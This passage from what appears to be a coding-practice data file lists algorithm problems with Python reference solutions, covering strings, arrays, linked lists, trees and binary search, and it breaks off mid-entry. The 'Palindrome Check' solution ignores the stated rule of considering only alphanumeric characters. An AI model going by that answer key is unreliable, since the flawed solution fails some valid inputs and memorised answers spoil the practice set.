            description: `Given a string <code>s</code> containing just the characters <code>'('</code>, <code>')'</code>, <code>'{'</code>, <code>'}'</code>, <code>'['</code> and <code>']'</code>, determine if the input string is valid.<br><br>An input string is valid if open brackets are closed by the same type of brackets in the correct order.<br><br><pre><strong>Input:</strong> s = "()[]{}"
<strong>Output:</strong> true</pre>`,
            code: 'def is_valid_brackets(s):\n    stack = []\n    mapping = {")": "(", "}": "{", "]": "["}\n    for char in s:\n        if char in mapping:\n            top = stack.pop() if stack else "#"\n            if mapping[char] != top:\n                return False\n        else:\n            stack.append(char)\n    return not stack'
        },
        {
            name: 'Stock Market Profit',
            difficulty: 'EASY',
            category: 'ARRAY',
            topics: ['ARRAY', 'GREEDY'],
            description: `You are given an array <code>prices</code> where <code>prices[i]</code> is the price of a given stock on the <code>i</code>th day.<br><br>You want to maximize your profit by choosing a single day to buy and a different day in the future to sell.<br><br><pre><strong>Input:</strong> prices = [7,1,5,3,6,4]
<strong>Output:</strong> 5
<strong>Explanation:</strong> Buy on day 2 (price=1) and sell on day 5 (price=6), profit = 5.</pre>`,
            code: 'def max_profit(prices):\n    min_price = float("inf")\n    max_profit = 0\n    for price in prices:\n        if price < min_price:\n            min_price = price\n        elif price - min_price > max_profit:\n            max_profit = price - min_price\n    return max_profit'
        },
        {
            name: 'Invert Linked List',
            difficulty: 'EASY',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `Given the <code>head</code> of a singly linked list, invert the list and return the reversed list.<br><br><pre><strong>Input:</strong> head = [1,2,3,4,5]
<strong>Output:</strong> [5,4,3,2,1]</pre>`,
            code: 'def invert_list(head):\n    prev = None\n    curr = head\n    while curr:\n        next_temp = curr.next\n        curr.next = prev\n        prev = curr\n        curr = next_temp\n    return prev'
        },
        {
            name: 'Palindrome Check',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING', 'TWO POINTERS'],
            description: `Given a string <code>s</code>, determine if it is a palindrome. A palindrome reads the same forward and backward.<br><br>Consider only alphanumeric characters and ignore cases.<br><br><pre><strong>Input:</strong> s = "racecar"
<strong>Output:</strong> true</pre>`,
            code: 'def is_palindrome(s):\n    s = s.lower()\n    left = 0\n    right = len(s) - 1\n    while left < right:\n        if s[left] != s[right]:\n            return False\n        left += 1\n        right -= 1\n    return True'
        },
        {
            name: 'Reverse String',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING'],
            description: `Write a function that reverses a string. The input string is given as an array of characters <code>s</code>.<br><br>You must do this by modifying the input array in-place.<br><br><pre><strong>Input:</strong> s = ["h","e","l","l","o"]
<strong>Output:</strong> ["o","l","l","e","h"]</pre>`,
            code: 'def reverse_string(s):\n    left = 0\n    right = len(s) - 1\n    while left < right:\n        s[left], s[right] = s[right], s[left]\n        left += 1\n        right -= 1\n    return s'
        },
        {
            name: 'Count Vowels',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING'],
            description: `Given a string <code>s</code>, count the number of vowels (a, e, i, o, u) in it. The string may contain both uppercase and lowercase letters.<br><br><pre><strong>Input:</strong> s = "Hello World"
<strong>Output:</strong> 3</pre>`,
            code: 'def count_vowels(s):\n    count = 0\n    vowels = "aeiouAEIOU"\n    for char in s:\n        if char in vowels:\n            count += 1\n    return count'
        },
        {
            name: 'Fibonacci Sequence',
            difficulty: 'EASY',
            category: 'MATH',
            topics: ['MATH'],
            description: `Given <code>n</code>, return the nth Fibonacci number. The Fibonacci sequence starts with 0 and 1, and each subsequent number is the sum of the two preceding ones.<br><br><pre><strong>Input:</strong> n = 6
<strong>Output:</strong> 8
<strong>Explanation:</strong> 0, 1, 1, 2, 3, 5, 8</pre>`,
            code: 'def fibonacci(n):\n    if n <= 1:\n        return n\n    a = 0\n    b = 1\n    for i in range(2, n + 1):\n        a, b = b, a + b\n    return b'
        },
        {
            name: 'Find Maximum',
            difficulty: 'EASY',
            category: 'ARRAY',
            topics: ['ARRAY'],
            description: `Given an array of integers <code>nums</code>, find and return the maximum value in the array.<br><br><pre><strong>Input:</strong> nums = [3, 7, 2, 9, 1, 5]
<strong>Output:</strong> 9</pre>`,
            code: 'def find_max(nums):\n    max_val = nums[0]\n    for num in nums:\n        if num > max_val:\n            max_val = num\n    return max_val'
        },
        {
            name: 'Remove Duplicates',
            difficulty: 'EASY',
            category: 'ARRAY',
            topics: ['ARRAY'],
            description: `Given a list of integers <code>nums</code>, remove all duplicate values and return a list with only unique elements, preserving their original order.<br><br><pre><strong>Input:</strong> nums = [1, 2, 2, 3, 4, 4, 5]
<strong>Output:</strong> [1, 2, 3, 4, 5]</pre>`,
            code: 'def remove_duplicates(nums):\n    seen = set()\n    result = []\n    for num in nums:\n        if num not in seen:\n            seen.add(num)\n            result.append(num)\n    return result'
        },
        {
            name: 'Missing Number',
            difficulty: 'EASY',
            category: 'ARRAY',
            topics: ['ARRAY'],
            description: `Given an array <code>nums</code> containing <code>n</code> distinct numbers in the range <code>[0, n]</code>, return the only number in the range that is missing.<br><br><pre><strong>Input:</strong> nums = [3,0,1]
<strong>Output:</strong> 2</pre>`,
            code: 'def missing_number(nums):\n    n = len(nums)\n    expected = n * (n + 1) // 2\n    actual = sum(nums)\n    return expected - actual'
        },
        {
            name: 'Single Number',
            difficulty: 'EASY',
            category: 'BIT MANIPULATION',
            topics: ['BIT MANIPULATION'],
            description: `Given a non-empty array of integers <code>nums</code>, every element appears twice except for one. Find that single one.<br><br><pre><strong>Input:</strong> nums = [4,1,2,1,2]
<strong>Output:</strong> 4</pre>`,
            code: 'def single_number(nums):\n    res = 0\n    for num in nums:\n        res ^= num\n    return res'
        },
        {
            name: 'Contains Duplicate',
            difficulty: 'EASY',
            category: 'HASH MAP',
            topics: ['HASH MAP'],
            description: `Given an integer array <code>nums</code>, return <code>true</code> if any value appears at least twice, and return <code>false</code> if every element is distinct.<br><br><pre><strong>Input:</strong> nums = [1,2,3,1]
<strong>Output:</strong> true</pre>`,
            code: 'def contains_duplicate(nums):\n    seen = set()\n    for num in nums:\n        if num in seen:\n            return True\n        seen.add(num)\n    return False'
        },
        {
            name: 'Majority Element',
            difficulty: 'EASY',
            category: 'ARRAY',
            topics: ['ARRAY'],
            description: `Given an array <code>nums</code> of size <code>n</code>, return the majority element. The majority element appears more than <code>n / 2</code> times.<br><br><pre><strong>Input:</strong> nums = [3,2,3]
<strong>Output:</strong> 3</pre>`,
            code: 'def majority_element(nums):\n    count = 0\n    candidate = None\n    for num in nums:\n        if count == 0:\n            candidate = num\n        count += (1 if num == candidate else -1)\n    return candidate'
        },
        {
            name: 'Move Zeroes',
            difficulty: 'EASY',
            category: 'TWO POINTERS',
            topics: ['TWO POINTERS'],
            description: `Given an integer array <code>nums</code>, move all <code>0</code>s to the end while maintaining the relative order of the non-zero elements.<br><br><pre><strong>Input:</strong> nums = [0,1,0,3,12]
<strong>Output:</strong> [1,3,12,0,0]</pre>`,
            code: 'def move_zeroes(nums):\n    pos = 0\n    for num in nums:\n        if num != 0:\n            nums[pos] = num\n            pos += 1\n    for i in range(pos, len(nums)):\n        nums[i] = 0'
        },
        {
            name: 'Plus One',
            difficulty: 'EASY',
            category: 'MATH',
            topics: ['MATH'],
            description: `You are given a large integer represented as an integer array <code>digits</code>. Increment the large integer by one and return the resulting array of digits.<br><br><pre><strong>Input:</strong> digits = [1,2,3]
<strong>Output:</strong> [1,2,4]</pre>`,
            code: 'def plus_one(digits):\n    for i in range(len(digits) - 1, -1, -1):\n        if digits[i] < 9:\n            digits[i] += 1\n            return digits\n        digits[i] = 0\n    return [1] + digits'
        },
        {
            name: 'Intersection of Two Arrays',
            difficulty: 'EASY',
            category: 'HASH MAP',
            topics: ['HASH MAP'],
            description: `Given two integer arrays <code>nums1</code> and <code>nums2</code>, return an array of their intersection. Each element in the result must be unique.<br><br><pre><strong>Input:</strong> nums1 = [1,2,2,1], nums2 = [2,2]
<strong>Output:</strong> [2]</pre>`,
            code: 'def intersection(nums1, nums2):\n    set1 = set(nums1)\n    set2 = set(nums2)\n    return list(set1 & set2)'
        },
        {
            name: 'Power of Two',
            difficulty: 'EASY',
            category: 'MATH',
            topics: ['MATH'],
            description: `Given an integer <code>n</code>, return <code>true</code> if it is a power of two. Otherwise return <code>false</code>.<br><br><pre><strong>Input:</strong> n = 16
<strong>Output:</strong> true</pre>`,
            code: 'def is_power_of_two(n):\n    if n <= 0:\n        return False\n    return (n & (n - 1)) == 0'
        },
        {
            name: 'Happy Number',
            difficulty: 'EASY',
            category: 'MATH',
            topics: ['MATH'],
            description: `Write an algorithm to determine if a number <code>n</code> is happy. A happy number is defined by replacing the number by the sum of the squares of its digits until it equals 1.<br><br><pre><strong>Input:</strong> n = 19
<strong>Output:</strong> true</pre>`,
            code: 'def is_happy(n):\n    seen = set()\n    while n != 1 and n not in seen:\n        seen.add(n)\n        n = sum(int(d) ** 2 for d in str(n))\n    return n == 1'
        },
        {
            name: 'Roman to Integer',
            difficulty: 'EASY',
            category: 'MATH',
            topics: ['MATH'],
            description: `Given a roman numeral, convert it to an integer.<br><br><pre><strong>Input:</strong> s = "IX"
<strong>Output:</strong> 9</pre>`,
            code: 'def roman_to_int(s):\n    roman = {"I": 1, "V": 5, "X": 10, "L": 50, "C": 100, "D": 500, "M": 1000}\n    res = 0\n    for i in range(len(s)):\n        if i + 1 < len(s) and roman[s[i]] < roman[s[i + 1]]:\n            res -= roman[s[i]]\n        else:\n            res += roman[s[i]]\n    return res'
        },
        {
            name: 'Longest Common Prefix',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING', 'PREFIX SUM'],
            description: `Write a function to find the longest common prefix string amongst an array of strings. If there is no common prefix, return an empty string.<br><br><pre><strong>Input:</strong> strs = ["flower","flow","flight"]
<strong>Output:</strong> "fl"</pre>`,
            code: 'def longest_common_prefix(strs):\n    if not strs:\n        return ""\n    prefix = strs[0]\n    for s in strs[1:]:\n        while not s.startswith(prefix):\n            prefix = prefix[:-1]\n            if not prefix:\n                return ""\n    return prefix'
        },
        {
            name: 'Valid Anagram',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING', 'STRING MATCHING'],
            description: `Given two strings <code>s</code> and <code>t</code>, return <code>true</code> if <code>t</code> is an anagram of <code>s</code>.<br><br><pre><strong>Input:</strong> s = "anagram", t = "nagaram"
<strong>Output:</strong> true</pre>`,
            code: 'def is_anagram(s, t):\n    if len(s) != len(t):\n        return False\n    counts = {}\n    for c in s:\n        counts[c] = counts.get(c, 0) + 1\n    for c in t:\n        if counts.get(c, 0) == 0:\n            return False\n        counts[c] -= 1\n    return True'
        },
        {
            name: 'Length of Last Word',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING'],
            description: `Given a string <code>s</code> consisting of words and spaces, return the length of the last word in the string.<br><br><pre><strong>Input:</strong> s = "Hello World"
<strong>Output:</strong> 5</pre>`,
            code: 'def length_of_last_word(s):\n    s = s.strip()\n    length = 0\n    for i in range(len(s) - 1, -1, -1):\n        if s[i] == " ":\n            break\n        length += 1\n    return length'
        },
        {
            name: 'First Unique Character',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING'],
            description: `Given a string <code>s</code>, find the first non-repeating character in it and return its index. If it does not exist, return <code>-1</code>.<br><br><pre><strong>Input:</strong> s = "leetcode"
<strong>Output:</strong> 0</pre>`,
            code: 'def first_uniq_char(s):\n    counts = {}\n    for c in s:\n        counts[c] = counts.get(c, 0) + 1\n    for i, c in enumerate(s):\n        if counts[c] == 1:\n            return i\n    return -1'
        },
        {
            name: 'Ransom Note',
            difficulty: 'EASY',
            category: 'HASH MAP',
            topics: ['HASH MAP'],
            description: `Given two strings <code>ransomNote</code> and <code>magazine</code>, return <code>true</code> if <code>ransomNote</code> can be constructed using letters from <code>magazine</code>.<br><br><pre><strong>Input:</strong> ransomNote = "aa", magazine = "aab"
<strong>Output:</strong> true</pre>`,
            code: 'def can_construct(ransomNote, magazine):\n    counts = {}\n    for c in magazine:\n        counts[c] = counts.get(c, 0) + 1\n    for c in ransomNote:\n        if counts.get(c, 0) == 0:\n            return False\n        counts[c] -= 1\n    return True'
        },
        {
            name: 'Isomorphic Strings',
            difficulty: 'EASY',
            category: 'HASH MAP',
            topics: ['HASH MAP'],
            description: `Given two strings <code>s</code> and <code>t</code>, determine if they are isomorphic. Two strings are isomorphic if the characters in <code>s</code> can be replaced to get <code>t</code>.<br><br><pre><strong>Input:</strong> s = "egg", t = "add"
<strong>Output:</strong> true</pre>`,
            code: 'def is_isomorphic(s, t):\n    map_st = {}\n    map_ts = {}\n    for a, b in zip(s, t):\n        if map_st.get(a, b) != b:\n            return False\n        if map_ts.get(b, a) != a:\n            return False\n        map_st[a] = b\n        map_ts[b] = a\n    return True'
        },
        {
            name: 'Word Pattern',
            difficulty: 'EASY',
            category: 'HASH MAP',
            topics: ['HASH MAP'],
            description: `Given a <code>pattern</code> and a string <code>s</code>, find if <code>s</code> follows the same pattern.<br><br><pre><strong>Input:</strong> pattern = "abba", s = "dog cat cat dog"
<strong>Output:</strong> true</pre>`,
            code: 'def word_pattern(pattern, s):\n    words = s.split()\n    if len(pattern) != len(words):\n        return False\n    p2w = {}\n    w2p = {}\n    for c, w in zip(pattern, words):\n        if c in p2w and p2w[c] != w:\n            return False\n        if w in w2p and w2p[w] != c:\n            return False\n        p2w[c] = w\n        w2p[w] = c\n    return True'
        },
        {
            name: 'Find the Difference',
            difficulty: 'EASY',
            category: 'STRING',
            topics: ['STRING'],
            description: `String <code>t</code> is generated by shuffling string <code>s</code> and adding one more letter. Return the letter that was added.<br><br><pre><strong>Input:</strong> s = "abcd", t = "abcde"
<strong>Output:</strong> "e"</pre>`,
            code: 'def find_the_difference(s, t):\n    code = 0\n    for c in s:\n        code ^= ord(c)\n    for c in t:\n        code ^= ord(c)\n    return chr(code)'
        },
        {
            name: 'Add Binary',
            difficulty: 'EASY',
            category: 'MATH',
            topics: ['MATH'],
            description: `Given two binary strings <code>a</code> and <code>b</code>, return their sum as a binary string.<br><br><pre><strong>Input:</strong> a = "11", b = "1"
<strong>Output:</strong> "100"</pre>`,
            code: 'def add_binary(a, b):\n    result = []\n    carry = 0\n    i, j = len(a) - 1, len(b) - 1\n    while i >= 0 or j >= 0 or carry:\n        total = carry\n        if i >= 0:\n            total += int(a[i])\n            i -= 1\n        if j >= 0:\n            total += int(b[j])\n            j -= 1\n        result.append(str(total % 2))\n        carry = total // 2\n    return "".join(reversed(result))'
        },
        {
            name: 'Linked List Cycle',
            difficulty: 'EASY',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `Given <code>head</code>, the head of a linked list, determine if the linked list has a cycle in it.<br><br><pre><strong>Input:</strong> head = [3,2,0,-4], pos = 1
<strong>Output:</strong> true</pre>`,
            code: 'def has_cycle(head):\n    slow = head\n    fast = head\n    while fast and fast.next:\n        slow = slow.next\n        fast = fast.next.next\n        if slow == fast:\n            return True\n    return False'
        },
        {
            name: 'Middle of Linked List',
            difficulty: 'EASY',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `Given the <code>head</code> of a singly linked list, return the middle node. If there are two middle nodes, return the second one.<br><br><pre><strong>Input:</strong> head = [1,2,3,4,5]
<strong>Output:</strong> [3,4,5]</pre>`,
            code: 'def middle_node(head):\n    slow = head\n    fast = head\n    while fast and fast.next:\n        slow = slow.next\n        fast = fast.next.next\n    return slow'
        },
        {
            name: 'Remove List Elements',
            difficulty: 'EASY',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `Given the <code>head</code> of a linked list and an integer <code>val</code>, remove all nodes with <code>Node.val == val</code>.<br><br><pre><strong>Input:</strong> head = [1,2,6,3,4,5,6], val = 6
<strong>Output:</strong> [1,2,3,4,5]</pre>`,
            code: 'def remove_elements(head, val):\n    dummy = ListNode(next=head)\n    curr = dummy\n    while curr.next:\n        if curr.next.val == val:\n            curr.next = curr.next.next\n        else:\n            curr = curr.next\n    return dummy.next'
        },
        {
            name: 'Palindrome Linked List',
            difficulty: 'EASY',
            category: 'LINKED LIST',
            topics: ['LINKED LIST'],
            description: `Given the <code>head</code> of a singly linked list, return <code>true</code> if it is a palindrome.<br><br><pre><strong>Input:</strong> head = [1,2,2,1]
<strong>Output:</strong> true</pre>`,
            code: 'def is_palindrome_ll(head):\n    vals = []\n    curr = head\n    while curr:\n        vals.append(curr.val)\n        curr = curr.next\n    return vals == vals[::-1]'
        },
        {
            name: 'Max Depth Binary Tree',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'DFS'],
            description: `Given the <code>root</code> of a binary tree, return its maximum depth.<br><br><pre><strong>Input:</strong> root = [3,9,20,null,null,15,7]
<strong>Output:</strong> 3</pre>`,
            code: 'def max_depth(root):\n    if not root:\n        return 0\n    return 1 + max(max_depth(root.left), max_depth(root.right))'
        },
        {
            name: 'Same Tree',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'DFS'],
            description: `Given the roots of two binary trees <code>p</code> and <code>q</code>, check if they are the same. Two trees are the same if they are structurally identical with the same values.<br><br><pre><strong>Input:</strong> p = [1,2,3], q = [1,2,3]
<strong>Output:</strong> true</pre>`,
            code: 'def is_same_tree(p, q):\n    if not p and not q:\n        return True\n    if not p or not q or p.val != q.val:\n        return False\n    return is_same_tree(p.left, q.left) and is_same_tree(p.right, q.right)'
        },
        {
            name: 'Symmetric Tree',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'DFS'],
            description: `Given the <code>root</code> of a binary tree, check whether it is a mirror of itself (symmetric around its center).<br><br><pre><strong>Input:</strong> root = [1,2,2,3,4,4,3]
<strong>Output:</strong> true</pre>`,
            code: 'def is_symmetric(root):\n    def mirror(a, b):\n        if not a and not b:\n            return True\n        if not a or not b:\n            return False\n        return a.val == b.val and mirror(a.left, b.right) and mirror(a.right, b.left)\n    return mirror(root.left, root.right) if root else True'
        },
        {
            name: 'Flip Binary Tree',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'DFS'],
            description: `Given the <code>root</code> of a binary tree, invert the tree and return its root.<br><br><pre><strong>Input:</strong> root = [4,2,7,1,3,6,9]
<strong>Output:</strong> [4,7,2,9,6,3,1]</pre>`,
            code: 'def invert_tree(root):\n    if root:\n        root.left, root.right = invert_tree(root.right), invert_tree(root.left)\n        return root\n    return None'
        },
        {
            name: 'Diameter of Binary Tree',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'DFS'],
            description: `Given the <code>root</code> of a binary tree, return the length of the diameter. The diameter is the longest path between any two nodes.<br><br><pre><strong>Input:</strong> root = [1,2,3,4,5]
<strong>Output:</strong> 3</pre>`,
            code: 'def diameter(root):\n    result = 0\n    def depth(node):\n        nonlocal result\n        if not node:\n            return 0\n        l = depth(node.left)\n        r = depth(node.right)\n        result = max(result, l + r)\n        return max(l, r) + 1\n    depth(root)\n    return result'
        },
        {
            name: 'Path Sum',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'MATH'],
            description: `Given the <code>root</code> of a binary tree and an integer <code>targetSum</code>, return <code>true</code> if the tree has a root-to-leaf path whose values add up to <code>targetSum</code>.<br><br><pre><strong>Input:</strong> root = [5,4,8,11,null,13,4], targetSum = 22
<strong>Output:</strong> true</pre>`,
            code: 'def has_path_sum(root, target):\n    if not root:\n        return False\n    if not root.left and not root.right:\n        return root.val == target\n    return has_path_sum(root.left, target - root.val) or has_path_sum(root.right, target - root.val)'
        },
        {
            name: 'Search in BST',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'BINARY SEARCH'],
            description: `Given the <code>root</code> of a BST and an integer <code>val</code>, find the node whose value equals <code>val</code> and return the subtree rooted at that node.<br><br><pre><strong>Input:</strong> root = [4,2,7,1,3], val = 2
<strong>Output:</strong> [2,1,3]</pre>`,
            code: 'def search_bst(root, val):\n    curr = root\n    while curr:\n        if curr.val == val:\n            return curr\n        elif curr.val > val:\n            curr = curr.left\n        else:\n            curr = curr.right\n    return None'
        },
        {
            name: 'Binary Search',
            difficulty: 'EASY',
            category: 'BINARY SEARCH',
            topics: ['BINARY SEARCH'],
            description: `Given a sorted array <code>nums</code> and a <code>target</code>, search for target in nums. If found, return its index. Otherwise return <code>-1</code>.<br><br><pre><strong>Input:</strong> nums = [-1,0,3,5,9,12], target = 9
<strong>Output:</strong> 4</pre>`,
            code: 'def search(nums, target):\n    left, right = 0, len(nums) - 1\n    while left <= right:\n        mid = (left + right) // 2\n        if nums[mid] == target:\n            return mid\n        elif nums[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1'
        },
        {
            name: 'First Bad Version',
            difficulty: 'EASY',
            category: 'BINARY SEARCH',
            topics: ['BINARY SEARCH'],
            description: `You have <code>n</code> versions <code>[1, 2, ..., n]</code> and you want to find the first bad one which causes all following ones to be bad.<br><br><pre><strong>Input:</strong> n = 5, bad = 4
<strong>Output:</strong> 4</pre>`,
            code: 'def first_bad_version(n):\n    left, right = 1, n\n    while left < right:\n        mid = (left + right) // 2\n        if isBadVersion(mid):\n            right = mid\n        else:\n            left = mid + 1\n    return left'
        },
        {
            name: 'Search Insert Position',
            difficulty: 'EASY',
            category: 'BINARY SEARCH',
            topics: ['BINARY SEARCH'],
            description: `Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be inserted.<br><br><pre><strong>Input:</strong> nums = [1,3,5,6], target = 5
<strong>Output:</strong> 2</pre>`,
            code: 'def search_insert(nums, target):\n    left, right = 0, len(nums) - 1\n    while left <= right:\n        mid = (left + right) // 2\n        if nums[mid] == target:\n            return mid\n        elif nums[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return left'
        },
        {
            name: 'Squares of Sorted Array',
            difficulty: 'EASY',
            category: 'TWO POINTERS',
            topics: ['TWO POINTERS', 'SORTING'],
            description: `Given a sorted array <code>nums</code>, return an array of the squares of each number sorted in non-decreasing order.<br><br><pre><strong>Input:</strong> nums = [-4,-1,0,3,10]
<strong>Output:</strong> [0,1,9,16,100]</pre>`,
            code: 'def sorted_squares(nums):\n    n = len(nums)\n    result = [0] * n\n    left, right = 0, n - 1\n    for i in range(n - 1, -1, -1):\n        if abs(nums[left]) > abs(nums[right]):\n            result[i] = nums[left] ** 2\n            left += 1\n        else:\n            result[i] = nums[right] ** 2\n            right -= 1\n    return result'
        },
        {
            name: 'Reverse Vowels',
            difficulty: 'EASY',
            category: 'TWO POINTERS',
            topics: ['TWO POINTERS'],
            description: `Given a string <code>s</code>, reverse only all the vowels in the string and return it.<br><br><pre><strong>Input:</strong> s = "hello"
<strong>Output:</strong> "holle"</pre>`,
            code: 'def reverse_vowels(s):\n    vowels = set("aeiouAEIOU")\n    s = list(s)\n    l, r = 0, len(s) - 1\n    while l < r:\n        while l < r and s[l] not in vowels:\n            l += 1\n        while l < r and s[r] not in vowels:\n            r -= 1\n        s[l], s[r] = s[r], s[l]\n        l += 1\n        r -= 1\n    return "".join(s)'
        },
        {
            name: 'Contains Duplicate II',
            difficulty: 'EASY',
            category: 'HASH MAP',
            topics: ['HASH MAP'],
            description: `Given an integer array <code>nums</code> and an integer <code>k</code>, return <code>true</code> if there are two distinct indices <code>i</code> and <code>j</code> such that <code>nums[i] == nums[j]</code> and <code>abs(i - j) <= k</code>.<br><br><pre><strong>Input:</strong> nums = [1,2,3,1], k = 3
<strong>Output:</strong> true</pre>`,
            code: 'def contains_nearby_dup(nums, k):\n    seen = {}\n    for i, num in enumerate(nums):\n        if num in seen and i - seen[num] <= k:\n            return True\n        seen[num] = i\n    return False'
        },
        {
            name: 'Balanced Binary Tree',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE', 'DFS'],
            description: `Given a binary tree, determine if it is height-balanced. A tree is balanced if left and right subtrees differ in height by no more than 1.<br><br><pre><strong>Input:</strong> root = [3,9,20,null,null,15,7]
<strong>Output:</strong> true</pre>`,
            code: 'def is_balanced(root):\n    def check(node):\n        if not node:\n            return 0\n        l = check(node.left)\n        r = check(node.right)\n        if l == -1 or r == -1 or abs(l - r) > 1:\n            return -1\n        return max(l, r) + 1\n    return check(root) != -1'
        },
        {
            name: 'LCA of a BST',
            difficulty: 'EASY',
            category: 'TREE',
            topics: ['TREE'],
            description: `Given a BST, find the lowest common ancestor (LCA) of two given nodes <code>p</code> and <code>q</code>.<br><br><pre><strong>Input:</strong> root = [6,2,8,0,4,7,9], p = 2, q = 8
<strong>Output:</strong> 6</pre>`,
            code: 'def lowest_common_ancestor(root, p, q):\n    curr = root\n    while curr:\n        if p.val > curr.val and q.val > curr.val:\n            curr = curr.right\n        elif p.val < curr.val and q.val < curr.val:\n            curr = curr.left\n        else:\n            return curr'
        },
        {
            name: 'Merge Sorted Array',
            difficulty: 'EASY',
            category: 'ARRAY',
            topics: ['ARRAY', 'SORTING'],
            description: `You are given two integer arrays <code>nums1</code> and <code>nums2</code>, sorted in non-decreasing order, and two integers <code>m</code> and <code>n</code>, representing the number of elements in <code>nums1</code> and <code>nums2</code> respectively. Merge <code>nums2</code> into <code>nums1</code> as one sorted array.<br><br><pre><strong>Input:</strong> nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3
<strong>Output:</strong> [1,2,2,3,5,6]</pre>`,
            code: 'def merge(nums1, m, nums2, n):\n    i, j, k = m - 1, n - 1, m + n - 1\n    while j >= 0:\n        if i >= 0 and nums1[i] > nums2[j]:\n            nums1[k] = nums1[i]\n            i -= 1\n        else:\n            nums1[k] = nums2[j]\n            j -= 1\n        k -= 1'
        },
        {
            name: 'Climbing Stairs',
            difficulty: 'EASY',
            category: 'DYNAMIC PROG',
            topics: ['DYNAMIC PROG'],
            description: `You are climbing a staircase. It takes <code>n</code> steps to reach the top. Each time you can climb 1 or 2 steps. In how many distinct ways can you climb to the top?<br><br><pre><strong>Input:</strong> n = 5
<strong>Output:</strong> 8</pre>`,
            code: 'def climb_stairs(n):\n    if n <= 2:\n        return n\n    a, b = 1, 2\n    for i in range(3, n + 1):\n        a, b = b, a + b\n    return b'
        },
        {
            name: '3Sum',
            difficulty: 'MEDIUM',
            category: 'TWO POINTERS',
            topics: ['TWO POINTERS', 'MATH'],
            description: `Given an integer array <code>nums</code>, return all the triplets <code>[nums[i], nums[j], nums[k]]</code> such that <code>i != j</code>, <code>i != k</code>, and <code>j != k</code>, and <code>nums[i] + nums[j] + nums[k] == 0</code>.<br><br>The solution set must not contain duplicate triplets.<br><br><pre><strong>Input:</strong> nums = [-1,0,1,2,-1,-4]
<strong>Output:</strong> [[-1,-1,2],[-1,0,1]]</pre>`,
            code: 'def three_sum(nums):\n    nums.sort()\n    res = []\n    for i in range(len(nums)):\n        if i > 0 and nums[i] == nums[i-1]:\n            continue\n        l, r = i + 1, len(nums) - 1\n        while l < r:\n            s = nums[i] + nums[l] + nums[r]\n            if s < 0:\n                l += 1\n            elif s > 0:\n                r -= 1\n            else:\n                res.append([nums[i], nums[l], nums[r]])\n                while l < r and nums[l] == nums[l+1]:\n                    l += 1\n                while l < r and nums[r] == nums[r-1]:\n                    r -= 1\n                l += 1\n                r -= 1\n    return res'
        },
        {
            name: 'Group Anagrams',
            difficulty: 'MEDIUM',
            category: 'HASH MAP',
            topics: ['HASH MAP', 'STRING MATCHING'],
            description: `Given an array of strings <code>strs</code>, group the anagrams together. You can return the answer in any order.<br><br><pre><strong>Input:</strong> strs = ["eat","tea","tan","ate","nat","bat"]
<strong>Output:</strong> [["bat"],["nat","tan"],["ate","eat","tea"]]</pre>`,
            code: 'def group_anagrams(strs):\n    res = {}\n    for s in strs:\n        count = [0] * 26\n        for c in s:\n            count[ord(c) - ord("a")] += 1\n        key = tuple(count)\n        if key not in res:\n            res[key] = []\n        res[key].append(s)\n    return list(res.values())'
        },
        {
            name: 'Longest Consecutive Seq',
            difficulty: 'MEDIUM',
            category: 'HASH MAP',
            topics: ['HASH MAP'],
            description: `Given an unsorted array of integers <code>nums</code>, return the length of the longest consecutive elements sequence.<br><br>You must write an algorithm that runs in <code>O(n)</code> time.<br><br><pre><strong>Input:</strong> nums = [100,4,200,1,3,2]
<strong>Output:</strong> 4</pre>`,
            code: 'def longest_consecutive(nums):\n    num_set = set(nums)\n    longest = 0\n    for n in nums:\n        if (n - 1) not in num_set:\n            length = 0\n            while (n + length) in num_set:\n                length += 1\n            longest = max(length, longest)\n    return longest'
        },
        {
            name: 'Container with Most Water',
            difficulty: 'MEDIUM',
            category: 'TWO POINTERS',
            topics: ['TWO POINTERS'],
            description: `Given an integer array <code>height</code> of length <code>n</code>. Find two lines that together with the x-axis form a container, such that the container contains the most water.<br><br><pre><strong>Input:</strong> height = [1,8,6,2,5,4,8,3,7]
<strong>Output:</strong> 49</pre>`,
            code: 'def max_area(height):\n    res = 0\n    l, r = 0, len(height) - 1\n    while l < r:\n        res = max(res, min(height[l], height[r]) * (r - l))\n        if height[l] < height[r]:\n            l += 1\n        else:\n            r -= 1\n    return res'
        },
        {
            name: 'Longest Substr No Repeat',
            difficulty: 'MEDIUM',
            category: 'SLIDING WINDOW',
            topics: ['SLIDING WINDOW'],
            description: `Given a string <code>s</code>, find the length of the longest substring without repeating characters.<br><br><pre><strong>Input:</strong> s = "abcabcbb"
<strong>Output:</strong> 3</pre>`,
            code: 'def length_of_longest_substring(s):\n    char_set = set()\n    l = 0\n    res = 0\n    for r in range(len(s)):\n        while s[r] in char_set:\n            char_set.remove(s[l])\n            l += 1\n        char_set.add(s[r])\n        res = max(res, r - l + 1)\n    return res'
        },
        {
            name: 'Longest Repeating Replacement',
            difficulty: 'MEDIUM',
            category: 'SLIDING WINDOW',
            topics: ['SLIDING WINDOW'],
